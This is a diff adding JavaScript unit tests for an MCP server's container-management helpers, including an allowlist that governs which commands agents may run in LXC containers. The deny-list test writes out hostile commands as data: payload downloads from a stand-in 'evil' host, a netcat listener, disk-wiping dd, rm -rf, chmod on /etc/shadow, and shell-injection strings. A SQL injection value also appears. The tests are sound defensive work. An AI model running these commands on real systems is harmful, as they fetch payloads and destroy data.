@@ -20,6 +20,11 @@ import {
   validGitRef, normalizeGitLogLimit, parseGitLogOutput, parseGitStatusPorcelain,
   capPatch, GIT_LOG_SEP, GIT_LOG_LIMIT_DEFAULT, GIT_LOG_LIMIT_MAX, GIT_PATCH_CAP,
   normalizeBuildLogLimit, buildLogFromEvents, BUILD_LOG_LIMIT_DEFAULT, BUILD_LOG_LIMIT_MAX,
+  validSha256, sha256Hex, zipChecksumError,
+  normalizeChunkSeq, decodeChunkBase64, UPLOAD_CHUNK_MAX_BYTES,
+  parseLxcListJson, lxcContainerIp, lxcContainerSummaries,
+  validFileMode, startupRunTimeoutMs, STARTUP_RUN_TIMEOUT_MAX_S, parseMarkedStreams,
+  PROJECT_COMMAND_OUTPUT_CAP,
 } from '../lib/mcp-logic.js';
 import { computeChangeHash, changePayload, canonicalJson } from '../mock2/change-logic.js';
 import { normalizeCloneMode, cloneCopyPatch, cloneSourceError } from '../mock2/clone-logic.js';
@@ -86,6 +91,7 @@ test('tool catalog: every tool has a name, description, and object schema', () =
     'list_lxc_containers', 'inspect_lxc_zip', 'apply_lxc_zip',
     'read_lxc_file', 'write_lxc_file', 'rerun_startup',
     'list_projects', 'send_project_build', 'clone_project', 'create_upload_ticket',
+    'append_upload_chunk', 'finish_upload',
     'interrupt_project_build', 'cancel_queued_build',
     'list_project_files', 'read_project_file', 'write_project_file', 'redeploy_project',
     'run_project_command', 'edit_project_file', 'search_project_files',
@@ -511,4 +517,560 @@ test('cloneSourceError: fresh works from archived; full needs the source active'
   assert.match(cloneSourceError({ ...base, lifecycle: 'provisioning' }, 'fresh'), /provisioning/);
   assert.match(cloneSourceError(null, 'fresh'), /not found/);
   assert.match(cloneSourceError({ lifecycle: 'active' }, 'fresh'), /repository/);
+});
+
+// ---- bugfix helpers: zip integrity, chunked upload, LXC list, mode, timeouts ----
+
+test('validSha256 normalizes hex and rejects everything else', () => {
+  const hex = 'A'.repeat(64);
+  assert.equal(validSha256(hex), 'a'.repeat(64));
+  assert.equal(validSha256(` ${'b'.repeat(64)} `), 'b'.repeat(64));
+  assert.equal(validSha256('b'.repeat(63)), null);
+  assert.equal(validSha256('g'.repeat(64)), null);
+  assert.equal(validSha256(''), null);
+  assert.equal(validSha256(null), null);
+});
+
+test('zipChecksumError: matching bytes pass; corruption names both hashes', () => {
+  const buf = Buffer.from('zip bytes');
+  const good = createHash('sha256').update(buf).digest('hex');
+  assert.equal(zipChecksumError(buf, good), null);
+  assert.equal(zipChecksumError(buf, good.toUpperCase()), null);
+  // A flipped byte is reported as TRANSPORT corruption, with declared vs got.
+  const err = zipChecksumError(Buffer.from('zip byteX'), good);
+  assert.match(err, /corrupted/);
+  assert.match(err, new RegExp(good));
+  assert.match(err, new RegExp(sha256Hex(Buffer.from('zip byteX'))));
+  // A malformed declared value is its own error, not a mismatch.
+  assert.match(zipChecksumError(buf, 'not-a-hash'), /64-character/);
+});
+
+test('normalizeChunkSeq takes whole numbers from 0, refuses the rest', () => {
+  assert.equal(normalizeChunkSeq(0), 0);
+  assert.equal(normalizeChunkSeq(7), 7);
+  assert.equal(normalizeChunkSeq('3'), 3);
+  assert.equal(normalizeChunkSeq(-1), null);
+  assert.equal(normalizeChunkSeq(1.5), null);
+  assert.equal(normalizeChunkSeq('x'), null);
+  assert.equal(normalizeChunkSeq(undefined), null);
+});
+
+test('decodeChunkBase64 round-trips, tolerates whitespace, enforces the cap', () => {
+  const payload = Buffer.from('chunk of a zip');
+  const ok = decodeChunkBase64(payload.toString('base64'));
+  assert.ok(!ok.error);
+  assert.deepEqual(ok.buf, payload);
+  // Whitespace (line-wrapped base64) is fine; garbage is not.
+  const wrapped = payload.toString('base64').replace(/(.{4})/g, '$1\n');
+  assert.deepEqual(decodeChunkBase64(wrapped).buf, payload);
+  assert.match(decodeChunkBase64('!!not base64!!').error, /base64/);
+  assert.match(decodeChunkBase64('').error, /required/);
+  assert.match(decodeChunkBase64(undefined).error, /required/);
+  // Over-cap chunks are refused with the split-it-up instruction.
+  const big = Buffer.alloc(UPLOAD_CHUNK_MAX_BYTES + 1).toString('base64');
+  assert.match(decodeChunkBase64(big).error, /split/);
+});
+
+test('parseLxcListJson: an unparseable or non-array answer is an ERROR, never []', () => {
+  assert.deepEqual(parseLxcListJson('[]').list, []);
+  assert.equal(parseLxcListJson(JSON.stringify([{ name: 'pp-Web' }])).list.length, 1);
+  // Truncated JSON (the 256 KB capture cap) must not read as an empty host —
+  // that is exactly the field failure that had an agent plan a duplicate
+  // container.
+  assert.match(parseLxcListJson('[{"name": "pp-W').error, /truncated/);
+  assert.match(parseLxcListJson('{"not": "an array"}').error, /not an array/);
+});
+
+test('lxcContainerIp prefers eth0 but falls back to any non-lo global inet', () => {
+  const addr = (address, family = 'inet', scope = 'global') => ({ address, family, scope });
+  assert.equal(lxcContainerIp({ network: { eth0: { addresses: [addr('10.0.0.5')] } } }), '10.0.0.5');
+  // Renamed NIC still yields the address; lo and link-local never do.
+  assert.equal(lxcContainerIp({
+    network: {
+      lo: { addresses: [addr('127.0.0.1', 'inet', 'local')] },
+      enp5s0: { addresses: [addr('fe80::1', 'inet6'), addr('192.168.1.9')] },
+    },
+  }), '192.168.1.9');
+  assert.equal(lxcContainerIp({ network: { eth0: { addresses: [addr('fd42::7', 'inet6')] } } }), null);
+  assert.equal(lxcContainerIp(null), null);
+});
+
+test('lxcContainerSummaries filters by prefix, strips it, and dedupes across projects', () => {
+  const list = [
+    { name: 'pp-Web', status: 'Running', state: { network: { eth0: { addresses: [{ address: '10.1.2.3', family: 'inet', scope: 'global' }] } } } },
+    { name: 'unrelated', status: 'Running' },
+    { name: 'pp-Web', status: 'Stopped' },      // same name from another project
+    { name: 'pp-db', status: 'Stopped', state: null },
+  ];
+  const rows = lxcContainerSummaries(list, 'pp-');
+  assert.deepEqual(rows, [
+    { name: 'Web', status: 'Running', ip: '10.1.2.3' },
+    { name: 'db', status: 'Stopped', ip: null },
+  ]);
+  // Case is preserved: the guest is pp-Web, not pp-web.
+  assert.equal(rows[0].name, 'Web');
+});
+
+test('validFileMode: three octal digits with or without the leading zero', () => {
+  assert.equal(validFileMode('0755'), '755');
+  assert.equal(validFileMode('755'), '755');
+  assert.equal(validFileMode('644'), '644');
+  assert.equal(validFileMode('0644'), '644');
+  // No setuid digit, no symbolic modes, no garbage.
+  assert.equal(validFileMode('4755'), null);
+  assert.equal(validFileMode('u+x'), null);
+  assert.equal(validFileMode('758'), null);
+  assert.equal(validFileMode(''), null);
+  assert.equal(validFileMode(755), '755');
+});
+
+test('startupRunTimeoutMs: caller wins clamped; env default is clamped too', () => {
+  assert.equal(startupRunTimeoutMs(300, 120000), 300000);
+  assert.equal(startupRunTimeoutMs(99999, 120000), STARTUP_RUN_TIMEOUT_MAX_S * 1000);
+  // No caller value → the operator's configured default…
+  assert.equal(startupRunTimeoutMs(undefined, 120000), 120000);
+  assert.equal(startupRunTimeoutMs(0, 90000), 90000);
+  // …which cannot itself exceed the cap, nor be nonsense.
+  assert.equal(startupRunTimeoutMs(undefined, 10 * 3600 * 1000), STARTUP_RUN_TIMEOUT_MAX_S * 1000);
+  assert.equal(startupRunTimeoutMs(undefined, NaN), 120000);
+});
+
+test('parseMarkedStreams recovers exit code and both tails; missing marker → found:false', () => {
+  const nonce = 'abc123';
+  const out = [
+    'noise the script printed before the wrapper reported',
+    `PP_${nonce}_EXIT:2`,
+    `PP_${nonce}_OUT`,
+    'stdout line 1',
+    'stdout line 2',
+    '',
+    `PP_${nonce}_ERR`,
+    'stderr tail',
+  ].join('\n');
+  const r = parseMarkedStreams(out, nonce);
+  assert.equal(r.found, true);
+  assert.equal(r.exit_code, 2);
+  // The blank separator line the wrapper echoes is stripped; the script's own
+  // trailing newline survives.
+  assert.equal(r.stdout, 'stdout line 1\nstdout line 2\n');
+  assert.equal(r.stderr, 'stderr tail');
+  // The wrapper never reporting (timeout, container down) is distinguishable
+  // from a reported empty run.
+  const dead = parseMarkedStreams('incus: instance not found', nonce);
+  assert.equal(dead.found, false);
+  assert.equal(dead.exit_code, null);
+  // A different nonce cannot be confused by lookalike markers in output.
+  assert.equal(parseMarkedStreams(out, 'ffffff').found, false);
+  assert.ok(PROJECT_COMMAND_OUTPUT_CAP >= 64 * 1024);
+});
+
+// ---- cycle 2: run_lxc_command allowlist + get_lxc_container detail ----
+
+import { readFileSync } from 'node:fs';
+import {
+  parseLxcCommand, lxcCommandTimeoutMs, lxcContainerDetail,
+} from '../lib/mcp-logic.js';
+
+const LXC_POLICY = JSON.parse(
+  readFileSync(new URL('../lib/mcp-policy/lxc-command-allowlist.json', import.meta.url), 'utf8'),
+);
+const WD = { workingDir: '/opt/app', registeredWorkingDir: '/opt/app' };
+
+test('parseLxcCommand: read-only allowlist admits observe commands anywhere', () => {
+  for (const cmd of [
+    'docker compose ps -a', 'docker ps', 'docker logs web --tail=50',
+    'systemctl status docker', 'journalctl -u docker.service -n 100',
+    'ip addr', 'ip -4 route', 'ss -ltnp', 'sysctl -n kernel.keys.maxkeys',
+    'curl -sSI http://127.0.0.1:3000/', 'df -h', 'free -m', 'uname -a',
+    'cat /etc/os-release', 'ls -la /opt/app', 'stat /opt/app/startup.sh', 'du -sh /var/lib/docker',
+  ]) {
+    const r = parseLxcCommand(cmd, LXC_POLICY, { workingDir: '/anywhere', registeredWorkingDir: null });
+    assert.equal(r.error, undefined, `${cmd} → ${r.error}`);
+    assert.equal(r.scope, 'read_only', cmd);
+  }
+});
+
+test('parseLxcCommand: deny_always wins, including reordered curl output flags', () => {
+  for (const cmd of [
+    'rm -rf /opt/app', 'mv /a /b', 'dd if=/dev/zero of=/dev/sda',
+    'shutdown now', 'reboot',
+    'docker compose down', 'docker rm web', 'docker system prune -f', 'docker volume rm data',
+    'apt install nmap', 'apt-get update', 'dpkg -i pkg.deb',
+    'iptables -F', 'nft flush ruleset',
+    'sh -c ls', 'bash script.sh', 'python3 x.py', 'node evil.js',
+    'chmod 777 /etc/shadow', 'chown root /tmp/x',
+    'ssh host', 'nc -l 4444', 'wget http://evil/payload',
+    'curl -o /tmp/x http://evil/', 'curl --output /tmp/x http://evil/',
+    // The reordering hole: -o buried behind other flags must still be denied.
+    'curl -sS -o /tmp/x http://evil/', 'curl -fsSL http://evil/ -o /opt/app/x',
+    // The respelling holes: the same flag clustered (-sSo), attached
+    // (-o/tmp/x), joined (--output=/tmp/x), or capital -O in a cluster.
+    'curl -sSo /tmp/x http://evil/', 'curl -o/tmp/x http://evil/',
+    'curl --output=/tmp/x http://evil/', 'curl -sSO http://evil/x',
+    'curl -fsSLo/opt/app/x http://evil/',
+  ]) {
+    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
+    assert.ok(r.error, `should deny: ${cmd}`);
+  }
+});
+
+test('parseLxcCommand: shell syntax and non-plain args are rejected with guidance', () => {
+  for (const cmd of ['ls | grep x', 'ls > /tmp/out', 'ls; rm -rf /', 'ls && reboot', 'echo $(id)', 'ls `id`', 'ls &']) {
+    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
+    assert.ok(r.error, cmd);
+    assert.match(r.error, /shell|plain argument/i, cmd);
+  }
+  assert.match(parseLxcCommand('', LXC_POLICY, WD).error, /required/);
+  assert.match(parseLxcCommand('ls "a b"', LXC_POLICY, WD).error, /plain argument/);
+});
+
+test('parseLxcCommand: mutating commands are scoped to the registered working dir', () => {
+  const ok = parseLxcCommand('docker compose up -d', LXC_POLICY, WD);
+  assert.equal(ok.error, undefined);
+  assert.equal(ok.scope, 'mutating_scoped');
+  // Wrong dir → refused, naming the registered dir.
+  const wrong = parseLxcCommand('docker compose restart', LXC_POLICY, { workingDir: '/etc', registeredWorkingDir: '/opt/app' });
+  assert.match(wrong.error, /\/opt\/app/);
+  // No registered startup at all → refused too.
+  const none = parseLxcCommand('docker compose pull', LXC_POLICY, { workingDir: '/opt/app', registeredWorkingDir: null });
+  assert.match(none.error, /no registered startup/);
+  // docker compose up needs the FULL prefix: bare "docker compose upgrade" is
+  // not a prefix match of ["docker","compose","up","-d"].
+  assert.ok(parseLxcCommand('docker compose up', LXC_POLICY, WD).error);
+});
+
+test('parseLxcCommand: unknown commands get the what-IS-allowed answer', () => {
+  const r = parseLxcCommand('vmstat 1 5', LXC_POLICY, WD);
+  assert.match(r.error, /not in the allowlist/);
+  assert.match(r.error, /docker/);
+});
+
+test('lxcCommandTimeoutMs follows the policy window', () => {
+  assert.equal(lxcCommandTimeoutMs(undefined, LXC_POLICY), 120000);
+  assert.equal(lxcCommandTimeoutMs(300, LXC_POLICY), 300000);
+  assert.equal(lxcCommandTimeoutMs(99999, LXC_POLICY), 1800000);
+  assert.equal(lxcCommandTimeoutMs(0, {}), 120000);
+});
+
+test('policy file shape: read_only, scoped, deny lists all present and argv-shaped', () => {
+  for (const entry of LXC_POLICY.read_only) assert.ok(Array.isArray(entry) && entry.length >= 1);
+  for (const entry of LXC_POLICY.mutating_scoped.commands) assert.ok(Array.isArray(entry));
+  for (const entry of LXC_POLICY.deny_always.commands) assert.ok(Array.isArray(entry));
+  assert.ok(LXC_POLICY.shell_syntax_rejected.includes('|'));
+  assert.ok(LXC_POLICY.output_cap_bytes >= 64 * 1024);
+});
+
+test('lxcContainerDetail maps addresses, config subset, and snapshots', () => {
+  const d = lxcContainerDetail({
+    status: 'Running',
+    created_at: '2026-08-01T00:00:00Z',
+    profiles: ['default'],
+    config: {
+      'security.nesting': 'true', 'security.privileged': 'false',
+      'limits.memory': '4GB', 'boot.autostart': 'true',
+      'image.os': 'Debian', 'volatile.eth0.hwaddr': '00:16:3e:aa:bb:cc',
+    },
+    state: {
+      network: {
+        lo: { addresses: [{ address: '127.0.0.1', family: 'inet', scope: 'local' }] },
+        eth0: {
+          addresses: [
+            { address: '10.167.1.20', family: 'inet', scope: 'global', netmask: '24' },
+            { address: 'fe80::1', family: 'inet6', scope: 'link' },
+          ],
+        },
+      },
+    },
+    snapshots: [{ name: 'pre-privilege-flip', created_at: '2026-08-10T00:00:00Z' }],
+  });
+  assert.equal(d.status, 'Running');
+  assert.deepEqual(d.addresses, [{ interface: 'eth0', address: '10.167.1.20', family: 'inet', netmask: '24' }]);
+  // Only security./limits./boot. keys — image and volatile noise excluded.
+  assert.deepEqual(Object.keys(d.config).sort(),
+    ['boot.autostart', 'limits.memory', 'security.nesting', 'security.privileged']);
+  assert.equal(d.snapshots[0].name, 'pre-privilege-flip');
+  // Nothing blows up on a minimal instance.
+  assert.deepEqual(lxcContainerDetail({}).addresses, []);
+});
+
+// ---- cycle 4: lifecycle/config gating ----
+
+import {
+  validSnapshotName, defaultSnapshotName, validateLxcConfigChange,
+  validIpv4, validImageAlias,
+} from '../lib/mcp-logic.js';
+
+const CFG_POLICY = JSON.parse(
+  readFileSync(new URL('../lib/mcp-policy/lxc-config-allowlist.json', import.meta.url), 'utf8'),
+);
+
+test('validateLxcConfigChange: allowlisted keys pass with their gates', () => {
+  const nest = validateLxcConfigChange('security.nesting', 'true', {}, CFG_POLICY);
+  assert.equal(nest.error, undefined);
+  assert.equal(nest.restartRequired, true);
+  assert.equal(nest.warning, null);
+
+  const cpu = validateLxcConfigChange('limits.cpu', '4', {}, CFG_POLICY);
+  assert.equal(cpu.restartRequired, false);
+  assert.ok(validateLxcConfigChange('limits.cpu', 'four', {}, CFG_POLICY).error);
+
+  assert.equal(validateLxcConfigChange('limits.memory', '8GB', {}, CFG_POLICY).error, undefined);
+  assert.equal(validateLxcConfigChange('limits.memory', '512MiB', {}, CFG_POLICY).error, undefined);
+  assert.ok(validateLxcConfigChange('limits.memory', 'lots', {}, CFG_POLICY).error);
+  assert.ok(validateLxcConfigChange('security.nesting', 'yes', {}, CFG_POLICY).error);
+});
+
+test('validateLxcConfigChange: privileged=true needs acknowledge_risk and carries the warning', () => {
+  const refused = validateLxcConfigChange('security.privileged', 'true', {}, CFG_POLICY);
+  assert.match(refused.error, /acknowledge_risk/);
+  assert.match(refused.error, /host root/);
+
+  const ok = validateLxcConfigChange('security.privileged', 'true', { acknowledgeRisk: true }, CFG_POLICY);
+  assert.equal(ok.error, undefined);
+  // The warning rides on SUCCESS too — the tool presents the trade-off, it
+  // does not just apply the flip.
+  assert.match(ok.warning, /host root/);
+  // Turning privileged OFF needs no acknowledgement.
+  const off = validateLxcConfigChange('security.privileged', 'false', {}, CFG_POLICY);
+  assert.equal(off.error, undefined);
+  assert.equal(off.warning, null);
+});
+
+test('validateLxcConfigChange: non-allowlisted keys are rejected, dangerous ones with their rationale', () => {
+  assert.match(validateLxcConfigChange('raw.lxc', 'x', {}, CFG_POLICY).error, /deliberately not writable.*host-level/i);
+  assert.match(validateLxcConfigChange('raw.idmap', 'x', {}, CFG_POLICY).error, /orphan/i);
+  const unknown = validateLxcConfigChange('user.foo', 'x', {}, CFG_POLICY);
+  assert.match(unknown.error, /not a writable config key/);
+  assert.match(unknown.error, /security\.nesting/);
+});
+
+test('snapshot names: custom validated, default sortable and deterministic', () => {
+  assert.equal(validSnapshotName('pre-upgrade_2'), 'pre-upgrade_2');
+  assert.equal(validSnapshotName('-bad'), null);
+  assert.equal(validSnapshotName('has space'), null);
+  assert.equal(validSnapshotName(''), null);
+  assert.equal(defaultSnapshotName(new Date(Date.UTC(2026, 7, 12, 9, 5, 3))), 'pp-mcp-20260812-090503');
+  assert.equal(defaultSnapshotName(new Date(Date.UTC(2026, 7, 12, 9, 5, 3)), 'pp-mcp-pre-security_privileged'),
+    'pp-mcp-pre-security_privileged-20260812-090503');
+});
+
+test('validIpv4 and validImageAlias reject the confusing shapes', () => {
+  assert.equal(validIpv4('10.167.1.20'), '10.167.1.20');
+  assert.equal(validIpv4('256.1.1.1'), null);
+  assert.equal(validIpv4('10.0.0.01'), null);
+  assert.equal(validIpv4('10.0.0'), null);
+  assert.equal(validIpv4('fe80::1'), null);
+  assert.equal(validImageAlias('images:debian/12'), 'images:debian/12');
+  assert.equal(validImageAlias('ubuntu:24.04'), 'ubuntu:24.04');
+  assert.equal(validImageAlias('--vm'), null);
+  assert.equal(validImageAlias('a b'), null);
+  assert.equal(validImageAlias(''), null);
+});
+
+// ---- cycle 3: routing validation + probe parsing ----
+
+import {
+  validDomainName, normalizePort, parseCurlProbeOutput, classifyCurlExit,
+} from '../lib/mcp-logic.js';
+
+test('validDomainName: FQDNs (incl. wildcard) pass, everything confusing fails', () => {
+  assert.equal(validDomainName('web.example.com'), 'web.example.com');
+  assert.equal(validDomainName('Web.Example.COM'), 'web.example.com');
+  assert.equal(validDomainName('*.example.com'), '*.example.com');
+  assert.equal(validDomainName('a-b.example.co.uk'), 'a-b.example.co.uk');
+  assert.equal(validDomainName('localhost'), null);          // needs a dot
+  assert.equal(validDomainName('-bad.example.com'), null);
+  assert.equal(validDomainName('exa mple.com'), null);
+  assert.equal(validDomainName('example..com'), null);
+  assert.equal(validDomainName('http://example.com'), null);
+  assert.equal(validDomainName(''), null);
+});
+
+test('normalizePort clamps to real ports', () => {
+  assert.equal(normalizePort(443), 443);
+  assert.equal(normalizePort('3000'), 3000);
+  assert.equal(normalizePort(0), null);
+  assert.equal(normalizePort(65536), null);
+  assert.equal(normalizePort(3.5), null);
+  assert.equal(normalizePort('web'), null);
+});
+
+test('parseCurlProbeOutput: last response block wins, headers whitelisted, trailer parsed', () => {
+  const dump = [
+    'HTTP/1.1 301 Moved Permanently',
+    'Location: https://web.example.com/',
+    'Set-Cookie: session=SECRET; HttpOnly',
+    '',
+    'HTTP/2 200',
+    'server: Caddy',
+    'content-type: text/html; charset=utf-8',
+    'set-cookie: sid=ALSO_SECRET',
+    '',
+    'PP_TIME:0.042',
+    'PP_CODE:200',
+  ].join('\r\n');
+  const r = parseCurlProbeOutput(dump);
+  assert.equal(r.status_code, 200);
+  assert.deepEqual(r.status_chain, [301, 200]);
+  assert.equal(r.server, 'Caddy');
+  assert.equal(r.content_type, 'text/html; charset=utf-8');
+  assert.equal(r.location, null);              // reset by the second block
+  assert.equal(r.time_seconds, 0.042);
+  // Cookies never surface anywhere in the parsed result.
+  assert.ok(!JSON.stringify(r).includes('SECRET'));
+});
+
+test('parseCurlProbeOutput: a 101 upgrade block parses even with no trailer', () => {
+  const r = parseCurlProbeOutput('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\r\n');
+  assert.equal(r.status_code, 101);
+  assert.equal(r.time_seconds, null);
+  assert.deepEqual(parseCurlProbeOutput('').status_chain, []);
+});
+
+test('classifyCurlExit maps the failure classes a caller acts on', () => {
+  assert.equal(classifyCurlExit(6).class, 'dns');
+  assert.equal(classifyCurlExit(7).class, 'connect_refused');
+  assert.equal(classifyCurlExit(28).class, 'timeout');
+  assert.equal(classifyCurlExit(35).class, 'tls');
+  assert.equal(classifyCurlExit(127).class, 'curl_missing');
+  assert.match(classifyCurlExit(99).hint, /99/);
+});
+
+// ---- cycle 5: observe parsing + static-site id handling ----
+
+import {
+  parseStatFileList, parseSystemctlShow, validUnitName, validProbeHost,
+  validFileGlob, normalizeServiceId,
+} from '../lib/mcp-logic.js';
+
+test('parseStatFileList: files, dirs, and symlinks with targets', () => {
+  const out = [
+    "-rw-r--r--|1024|1723400000|'/opt/app/config.json'",
+    "drwxr-xr-x|4096|1723400001|'/opt/app/data'",
+    "lrwxrwxrwx|11|1723400002|'/opt/app/current' -> '/opt/app/v2'",
+    'garbage line',
+  ].join('\n');
+  const entries = parseStatFileList(out);
+  assert.equal(entries.length, 3);
+  assert.deepEqual(entries[0], {
+    path: '/opt/app/config.json', type: 'file', size: 1024,
+    mode: 'rw-r--r--', mtime: new Date(1723400000 * 1000).toISOString(),
+  });
+  assert.equal(entries[1].type, 'dir');
+  assert.equal(entries[2].type, 'symlink');
+  assert.equal(entries[2].target, '/opt/app/v2');
+  assert.deepEqual(parseStatFileList(''), []);
+});
+
+test('parseSystemctlShow splits key=value, keeping = inside values', () => {
+  const r = parseSystemctlShow('ActiveState=active\nExecMainStatus=0\nResult=success\nX=a=b\n');
+  assert.equal(r.ActiveState, 'active');
+  assert.equal(r.ExecMainStatus, '0');
+  assert.equal(r.X, 'a=b');
+});
+
+test('validUnitName / validProbeHost / validFileGlob reject option-lookalikes and junk', () => {
+  assert.equal(validUnitName('docker.service'), 'docker.service');
+  assert.equal(validUnitName('proxypilot-startup.service'), 'proxypilot-startup.service');
+  assert.equal(validUnitName('-u'), null);
+  assert.equal(validUnitName('a b'), null);
+  assert.equal(validProbeHost('127.0.0.1'), '127.0.0.1');
+  assert.equal(validProbeHost('db.internal'), 'db.internal');
+  assert.equal(validProbeHost('-flag'), null);
+  assert.equal(validProbeHost('a b'), null);
+  assert.equal(validFileGlob('*.yml'), '*.yml');
+  assert.equal(validFileGlob('docker-compose.y?l'), 'docker-compose.y?l');
+  assert.equal(validFileGlob('../x'), null);
+  assert.equal(validFileGlob('a/b'), null);
+});
+
+test('normalizeServiceId keeps uuid AND legacy integer ids (the Number() NaN trap)', () => {
+  assert.equal(normalizeServiceId('3'), '3');
+  assert.equal(normalizeServiceId(3), '3');
+  const uuid = '550e8400-e29b-41d4-a716-446655440000';
+  assert.equal(normalizeServiceId(uuid), uuid);
+  assert.equal(normalizeServiceId(''), null);
+  assert.equal(normalizeServiceId("x'; DROP TABLE services;--"), null);
+  assert.equal(normalizeServiceId(null), null);
+});
+
+test('tool catalog covers the full 25-tool upgrade surface', () => {
+  const names = new Set(MCP_TOOLS.map((t) => t.name));
+  for (const required of [
+    // cycle 2
+    'get_lxc_container', 'run_lxc_command',
+    // cycle 3
+    'list_routes', 'get_route', 'test_route', 'set_route',
+    // cycle 4
+    'create_lxc_container', 'control_lxc_container', 'set_lxc_config',
+    'set_lxc_network', 'snapshot_lxc_container', 'lxc_file_diff', 'restore_lxc_file',
+    // cycle 5
+    'list_lxc_files', 'search_lxc_files', 'get_lxc_logs', 'probe_lxc_port', 'get_lxc_startup',
+    'create_static_site', 'get_static_site', 'list_static_site_files',
+    'read_static_site_file', 'write_static_site_file', 'get_static_site_cert',
+  ]) {
+    assert.ok(names.has(required), `missing tool ${required}`);
+  }
+});
+
+// ---- follow-ups: access-log error counts + policy drift guard ----
+
+import { summarizeAccessLog, caddyAccessLogPath } from '../lib/mcp-logic.js';
+
+test('summarizeAccessLog counts requests and 5xx inside the window, counts only', () => {
+  const now = 1_755_000_000_000;                    // fixed clock, ms
+  const at = (secAgo, status, extra = {}) =>
+    JSON.stringify({ ts: (now - secAgo * 1000) / 1000, status, request: { uri: '/secret?token=abc' }, ...extra });
+  const text = [
+    at(60, 200), at(120, 200), at(300, 301),
+    at(400, 502), at(500, 502), at(600, 504),
+    at(4000, 502),                                   // outside the hour
+    at(30, 200, { ts: undefined }),                  // no ts → skipped
+    'not json at all',
+    at(90, 404),
+  ].join('\n');
+  const r = summarizeAccessLog(text, now);
+  assert.equal(r.window_seconds, 3600);
+  assert.equal(r.requests, 7);                       // 4000s-ago and broken lines excluded
+  assert.equal(r.errors_5xx, 3);
+  assert.deepEqual(r.by_error_status, { 502: 2, 504: 1 });
+  // The tail reached back past the window start (the 4000s entry), so the
+  // window is fully covered.
+  assert.equal(r.partial_window, false);
+  // Nothing but counts leaves — no URI, no token, no headers.
+  assert.ok(!JSON.stringify(r).includes('secret'));
+  assert.ok(!JSON.stringify(r).includes('token'));
+});
+
+test('summarizeAccessLog flags a partial window when the tail starts inside it', () => {
+  const now = 1_755_000_000_000;
+  const text = JSON.stringify({ ts: (now - 600 * 1000) / 1000, status: 502 });
+  const r = summarizeAccessLog(text, now);
+  assert.equal(r.errors_5xx, 1);
+  assert.equal(r.partial_window, true);              // oldest entry is only 10 min back
+  assert.deepEqual(summarizeAccessLog('', now), {
+    window_seconds: 3600, requests: 0, errors_5xx: 0, by_error_status: {}, partial_window: false,
+  });
+});
+
+test('caddyAccessLogPath matches the merged config builder, wildcards sanitized', () => {
+  assert.equal(caddyAccessLogPath('web.example.com'), '/var/log/caddy/web.example.com.log');
+  assert.equal(caddyAccessLogPath('*.example.com'), '/var/log/caddy/_wildcard_.example.com.log');
+});
+
+// The two policy JSONs are vendored from the component spec, and the spec's
+// usage notes call them the enforcement source of truth. This guard makes the
+// keep-in-sync comments mechanical: edit one copy without the other and the
+// suite says so.
+test('drift guard: lib/mcp-policy matches the mcp-lxc-sites-upgrades component spec', () => {
+  const componentDoc = JSON.parse(readFileSync(
+    new URL('../../../../docs/features/examples/mcp-lxc-sites-upgrades.component.json', import.meta.url), 'utf8',
+  ));
+  for (const name of ['lxc-command-allowlist.json', 'lxc-config-allowlist.json']) {
+    const vendored = JSON.parse(readFileSync(new URL(`../lib/mcp-policy/${name}`, import.meta.url), 'utf8'));
+    const specFile = componentDoc.files.find((f) => f.path === `spec/mcp-upgrades/policy/${name}`);
+    assert.ok(specFile, `component spec no longer carries policy/${name}`);
+    assert.deepEqual(vendored, JSON.parse(specFile.content),
+      `${name} drifted between lib/mcp-policy/ and the component spec — update BOTH (the spec is the design record, lib/mcp-policy is what the server enforces)`);
+  }
 });
